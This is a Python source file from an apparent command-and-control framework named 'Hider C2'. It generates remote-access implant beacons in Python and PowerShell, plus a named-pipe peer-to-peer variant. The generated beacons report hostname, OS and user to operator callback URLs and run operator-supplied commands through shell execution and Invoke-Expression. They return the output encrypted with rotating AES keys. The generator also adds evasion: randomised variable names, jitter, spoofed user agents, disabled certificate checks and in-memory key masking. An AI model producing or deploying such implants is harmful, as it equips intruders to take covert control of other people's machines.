"""
c2/beacon_gen.py — Implant Beacon Generator

Generates customized Python and PowerShell beacon scripts that call back
to the Hider C2 listener. The beacons support configurable sleep intervals,
jitter, kill dates, and custom user agents.
"""
import os
import sys
import random
import string

# Add parent to path for poly_engine access
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


def _rand_var(n=8):
    return random.choice(string.ascii_letters) + ''.join(
        random.choices(string.ascii_letters + string.digits, k=n - 1)
    )

def _get_cert(ext):
    cert_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "certs", f"client.{ext}")
    if os.path.exists(cert_path):
        import base64
        with open(cert_path, "rb") as f:
            return base64.b64encode(f.read()).decode()
    return ""



class BeaconGen:

    @staticmethod
    def python_beacon(callback_url, sleep_sec=5, jitter_pct=20, kill_date=None, user_agent=None, mtls=False, headers=None, sleep_mask=False):
        """
        Generate a Python beacon script.
        """
        ua = user_agent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        kill_check = ""
        if kill_date:
            kill_check = f"""
    from datetime import datetime
    if datetime.utcnow() > datetime.fromisoformat("{kill_date}"):
        sys.exit(0)
"""
        jitter_lo = max(1, int(sleep_sec * (1 - jitter_pct / 100)))
        jitter_hi = int(sleep_sec * (1 + jitter_pct / 100))

        cert_b64 = _get_cert("pem") if mtls else ""
        mtls_setup = f"""
import tempfile, ssl
CTX = None
if "{cert_b64}":
    cert_path = os.path.join(tempfile.gettempdir(), 'c.pem')
    with open(cert_path, 'wb') as f: f.write(base64.b64decode('{cert_b64}'))
    CTX = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
    CTX.check_hostname = False
    CTX.verify_mode = ssl.CERT_NONE
    CTX.load_cert_chain(cert_path)
"""
        urls = [u.strip() for u in callback_url.split(',')]
        urls_py = "[" + ",".join([f'"{u}"' for u in urls]) + "]"

        headers_py = "{}"
        if headers:
            import json
            try:
                headers_py = json.dumps(json.loads(headers))
            except: pass

        mask_def = ""
        mask_call = ""
        if sleep_mask:
            mask_def = """
def mask_memory():
    global AES_KEY
    if AES_KEY and HAS_AES:
        AES_KEY = bytes([b ^ 0xAA for b in AES_KEY])
"""
            mask_call = "mask_memory()"

        beacon = f'''#!/usr/bin/env python3
"""Hider C2 Beacon — Auto-generated"""
import os, sys, time, random, json, subprocess, platform, socket, base64
try:
    from urllib.request import Request, urlopen
    from urllib.parse import urlencode
except ImportError:
    from urllib2 import Request, urlopen
    from urllib import urlencode

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
    HAS_AES = True
except ImportError:
    HAS_AES = False

C2_URLS   = {urls_py}
SLEEP_LO  = {jitter_lo}
SLEEP_HI  = {jitter_hi}
UA        = "{ua}"
SESSION   = None
AES_KEY   = None

{mtls_setup}
{mask_def}

def sysinfo():
    return {{
        "hostname": socket.gethostname(),
        "os": platform.system() + " " + platform.release(),
        "user": os.environ.get("USER", os.environ.get("USERNAME", "unknown")),
    }}

def get_c2(): return random.choice(C2_URLS)

def _req(url, data=None):
    hdrs = {{"User-Agent": UA, "Content-Type": "application/json"}}
    hdrs.update({headers_py})
    r = Request(url, data=data, headers=hdrs)
    kwargs = {{"timeout": 30}}
    if CTX: kwargs["context"] = CTX
    return urlopen(r, **kwargs).read().decode()

def keyx():
    global AES_KEY
    if not HAS_AES: return
    new_key = os.urandom(32)
    _req(get_c2() + "/keyx", json.dumps({{"id": SESSION, "key": base64.b64encode(new_key).decode()}}).encode())
    AES_KEY = new_key

def encrypt(data_str):
    if not AES_KEY or not HAS_AES: return data_str
    iv = os.urandom(16)
    cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
    return base64.b64encode(iv + cipher.encrypt(pad(data_str.encode(), 16))).decode()

def decrypt(b64_str):
    if not AES_KEY or not HAS_AES or b64_str == "NOP": return b64_str
    try:
        raw = base64.b64decode(b64_str)
        cipher = AES.new(AES_KEY, AES.MODE_CBC, raw[:16])
        return unpad(cipher.decrypt(raw[16:]), 16).decode()
    except:
        return b64_str

def beacon():
    global SESSION
    info = sysinfo()
    params = urlencode({{"id": SESSION or "", "hostname": info["hostname"], "os": info["os"], "user": info["user"]}})
    resp = json.loads(_req(get_c2() + "/beacon?" + params))
    if not SESSION:
        SESSION = resp.get("id")
        keyx() # initial key exchange
    return resp

def send_result(cmd_id, output):
    data = json.dumps({{"cmd_id": cmd_id, "output": encrypt(output), "id": SESSION}}).encode()
    _req(get_c2() + "/result", data)

def execute(cmd):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=120)
        return r.stdout + r.stderr
    except Exception as e:
        return str(e)

def main():
{kill_check}
    cycle = 0
    while True:
        try:
            if cycle % 10 == 9: keyx() # Rotate key
            resp = beacon()
            cmd_enc = resp.get("cmd", "NOP")
            cmd = decrypt(cmd_enc) if cmd_enc != "NOP" else "NOP"
            if cmd != "NOP":
                output = execute(cmd)
                send_result(resp.get("cmd_id"), output)
        except Exception:
            pass
        cycle += 1
        {mask_call}
        time.sleep(random.randint(SLEEP_LO, SLEEP_HI))
        {mask_call}

if __name__ == "__main__":
    main()
'''
        return beacon

    @staticmethod
    def powershell_beacon(callback_url, sleep_sec=5, jitter_pct=20, kill_date=None, user_agent=None, mtls=False, headers=None, sleep_mask=False):
        """
        Generate a PowerShell beacon script.
        """
        ua = user_agent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        jitter_lo = max(1, int(sleep_sec * (1 - jitter_pct / 100)))
        jitter_hi = int(sleep_sec * (1 + jitter_pct / 100))

        kill_block = ""
        if kill_date:
            kill_block = f'if ((Get-Date) -gt [DateTime]"{kill_date}") {{ exit }}'

        pfx_b64 = _get_cert("pfx") if mtls else ""
        vC2 = _rand_var(); vSID = _rand_var(); vSL = _rand_var(); vSH = _rand_var()
        vKey = _rand_var(); vCy = _rand_var()
        
        urls = [u.strip() for u in callback_url.split(',')]
        urls_ps = "@(" + ",".join([f'"{u}"' for u in urls]) + ")"
        
        headers_block = ""
        if headers:
            import json
            try:
                h = json.loads(headers)
                for k,v in h.items():
                    headers_block += f'\n        $params.Headers["{k}"] = "{v}"'
            except: pass

        mask_def = ""
        mask_call = ""
        if sleep_mask:
            mask_def = f"""
function Mask-Memory {{
    if (${vKey}) {{
        for ($i=0; $i -lt ${vKey}.Length; $i++) {{
            ${vKey}[$i] = ${vKey}[$i] -bxor 0xAA
        }}
    }}
}}
"""
            mask_call = "Mask-Memory"

        beacon = f"""
# Hider C2 Beacon — PowerShell
${vC2}_list = {urls_ps}
${vSID} = $null
${vSL}  = {jitter_lo}
${vSH}  = {jitter_hi}
${vKey} = $null
${vCy}  = 0

[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}}
$cert = $null
if ("{pfx_b64}") {{
    $certBytes = [Convert]::FromBase64String("{pfx_b64}")
    $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2(,$certBytes, "infected")
}}

{mask_def}

function Invoke-Req ($Endpoint, $Body=$null) {{
    $Url = (Get-Random -InputObject ${vC2}_list) + $Endpoint
    $params = @{{
        Uri = $Url
        UseBasicParsing = $true
        Headers = @{{"User-Agent"="{ua}"}}
    }}
    {headers_block}
    if ($cert) {{ $params.Certificate = $cert }}
    if ($Body) {{
        $params.Method = "POST"
        $params.Body = $Body
        $params.ContentType = "application/json"
    }} else {{
        $params.Method = "GET"
    }}
    return Invoke-RestMethod @params
}}

function Rotate-Key {{
    $aes = New-Object Security.Cryptography.AesManaged
    $aes.GenerateKey()
    ${vKey} = $aes.Key
    $b64 = [Convert]::ToBase64String($aes.Key)
    $body = @{{id=${vSID}; key=$b64}} | ConvertTo-Json
    Invoke-Req -Endpoint "/keyx" -Body $body | Out-Null
}}

function Encrypt-Data ($Plain) {{
    if (-not ${vKey} -or -not $Plain) {{ return $Plain }}
    $aes = New-Object Security.Cryptography.AesManaged
    $aes.Key = ${vKey}
    $aes.GenerateIV()
    $enc = $aes.CreateEncryptor()
    $bytes = [Text.Encoding]::UTF8.GetBytes($Plain)
    $ct = $enc.TransformFinalBlock($bytes, 0, $bytes.Length)
    $res = New-Object byte[] ($aes.IV.Length + $ct.Length)
    [Array]::Copy($aes.IV, $res, $aes.IV.Length)
    [Array]::Copy($ct, 0, $res, $aes.IV.Length, $ct.Length)
    return [Convert]::ToBase64String($res)
}}

function Decrypt-Data ($B64) {{
    if (-not ${vKey} -or $B64 -eq "NOP") {{ return $B64 }}
    try {{
        $raw = [Convert]::FromBase64String($B64)
        $aes = New-Object Security.Cryptography.AesManaged
        $aes.Key = ${vKey}
        $iv = New-Object byte[] 16
        [Array]::Copy($raw, $iv, 16)
        $aes.IV = $iv
        $dec = $aes.CreateDecryptor()
        $ct = New-Object byte[] ($raw.Length - 16)
        [Array]::Copy($raw, 16, $ct, 0, $ct.Length)
        $plain = $dec.TransformFinalBlock($ct, 0, $ct.Length)
        return [Text.Encoding]::UTF8.GetString($plain)
    }} catch {{ return $B64 }}
}}

function Get-SysInfo {{
    $h = $env:COMPUTERNAME
    $o = [Environment]::OSVersion.VersionString
    $u = $env:USERNAME
    return @{{hostname=$h; os=$o; user=$u}}
}}

while ($true) {{
    {kill_block}
    try {{
        if (${vCy} % 10 -eq 9 -and ${vSID}) {{ Rotate-Key }}
        
        $info = Get-SysInfo
        $q = "?id=${{{vSID}}}&hostname=$($info.hostname)&os=$($info.os)&user=$($info.user)"
        $resp = Invoke-Req -Endpoint "/beacon$q"
        
        if (-not ${{{vSID}}}) {{ 
            ${{{vSID}}} = $resp.id 
            Rotate-Key
        }}
        
        $cmd_enc = $resp.cmd
        if ($cmd_enc -ne "NOP") {{
            $cmd = Decrypt-Data $cmd_enc
            $out = try {{ Invoke-Expression $cmd 2>&1 | Out-String }} catch {{ $_.Exception.Message }}
            $body = @{{cmd_id=$resp.cmd_id; output=(Encrypt-Data $out); id=${{{vSID}}}}} | ConvertTo-Json
            Invoke-Req -Endpoint "/result" -Body $body | Out-Null
        }}
        ${vCy}++
    }} catch {{}}
    {mask_call}
    Start-Sleep -Seconds (Get-Random -Minimum ${{{vSL}}} -Maximum ${{{vSH}}})
    {mask_call}
}}
"""
        return beacon

    @staticmethod
    def ptp_pipe_beacon(pipe_name="hider_c2", kill_date=None, user_agent=None):
        kill_block = ""
        if kill_date:
            kill_block = f'if ((Get-Date) -gt [DateTime]"{kill_date}") {{ exit }}'

        beacon = f"""
# Hider C2 P2P Beacon (Named Pipe)
$pipeName = "{pipe_name}"

function Get-SysInfo {{
    $h = $env:COMPUTERNAME
    $o = [Environment]::OSVersion.VersionString
    $u = $env:USERNAME
    return @{{hostname=$h; os=$o; user=$u}}
}}

$pipe = New-Object System.IO.Pipes.NamedPipeServerStream($pipeName, [System.IO.Pipes.PipeDirection]::InOut, 1, [System.IO.Pipes.PipeTransmissionMode]::Byte, [System.IO.Pipes.PipeOptions]::Asynchronous)
$pipe.WaitForConnection()

$reader = New-Object System.IO.StreamReader($pipe)
$writer = New-Object System.IO.StreamWriter($pipe)
$writer.AutoFlush = $true

$info = Get-SysInfo | ConvertTo-Json -Compress
$writer.WriteLine($info)

while ($true) {{
    {kill_block}
    try {{
        $cmd = $reader.ReadLine()
        if ($cmd) {{
            if ($cmd -eq "PING") {{
                $writer.WriteLine("PONG")
            }} else {{
                $out = try {{ Invoke-Expression $cmd 2>&1 | Out-String }} catch {{ $_.Exception.Message }}
                if (-not $out) {{ $out = "`n" }}
                $out_b64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($out))
                $writer.WriteLine($out_b64)
            }}
        }} else {{
            Start-Sleep -Milliseconds 500
        }}
    }} catch {{
        break
    }}
}}
"""
        return beacon

    @staticmethod
    def generate(callback_url=None, lang="python", output_path=None, ptp="none", pipe_name="hider_c2", **kwargs):
        """High-level generator."""
        if ptp == "named-pipe":
            code = BeaconGen.ptp_pipe_beacon(pipe_name, kill_date=kwargs.get("kill_date"))
        elif lang == "python":
            code = BeaconGen.python_beacon(callback_url, **kwargs)
        else:
            code = BeaconGen.powershell_beacon(callback_url, **kwargs)

        if output_path:
            with open(output_path, 'w') as f:
                f.write(code)
        return code
